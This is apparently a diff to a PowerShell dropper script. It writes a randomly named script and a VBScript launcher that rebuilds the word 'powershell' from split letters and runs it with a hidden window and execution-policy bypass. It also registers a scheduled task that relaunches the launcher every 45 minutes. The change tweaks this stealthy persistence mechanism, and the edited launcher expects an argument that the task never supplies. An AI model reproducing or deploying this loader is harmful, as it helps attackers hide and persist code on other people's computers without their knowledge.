@@ -67,10 +67,11 @@ Set-Content -Path "$fullPath\$randomProgram.ps1" -Value $scriptContent -Force
 
 $vbsContent = @'
 On Error Resume Next
-Dim arr, cmd
-arr = Split(""p,o,w,e,r,s,h,e,l,l"", "","")
-cmd = Join(arr, """") & "" -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """"$fullPath\$randomProgram.ps1""""
-CreateObject(""WScript.Shell"").Run cmd, 0, False
+Dim arr, cmd, shell
+arr = Split("p,o,w,e,r,s,h,e,l,l", ",")
+cmd = Join(arr, "") & " -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & WScript.Arguments(0) & """"
+Set shell = CreateObject("WScript.Shell")
+shell.Run cmd, 0, False
 '@
 
 Set-Content -Path "$fullPath\$randomProgram.vbs" -Value $vbsContent -Force
@@ -84,10 +85,10 @@ try {
 
 Start-Sleep 2
 $taskName2 = "${randomProgram}Startup"
-$scriptPath = "$fullPath\$randomProgram.vbs"
-try {
-    schtasks /create /tn "$taskName2" /tr $scriptPath /sc MINUTE /mo 45 /f
-} catch {}
 
+$scriptPath = "`"$fullPath\$randomProgram.vbs`""
+try {
+schtasks /create /tn "$taskName2" /tr $scriptPath /sc MINUTE /mo 45 /f
+} catch { }
 Start-Sleep 5
 schtasks /run /tn "$randomProgram"
